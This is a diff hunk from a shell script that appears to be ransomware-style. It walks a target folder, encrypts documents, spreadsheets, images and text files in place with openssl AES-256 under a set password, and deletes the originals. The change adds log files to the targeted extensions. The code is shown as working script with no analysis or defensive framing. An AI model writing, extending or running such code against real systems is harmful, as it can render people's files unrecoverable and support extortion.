@@ -21,7 +21,7 @@ count=0
 for f in "$TARGET"/*; do
     [ -f "$f" ] || continue
     case "${f##*.}" in
-        pdf|doc|docx|xls|xlsx|ppt|pptx|txt|jpg|jpeg|png|odt|csv|md)
+        pdf|doc|docx|xls|xlsx|ppt|pptx|txt|jpg|jpeg|png|odt|csv|md|log)
             if openssl enc -aes-256-cbc -salt -pbkdf2 \
                 -in "$f" -out "$f$EXT" -pass pass:"$PASS" 2>/dev/null; then
                 rm -f "$f"
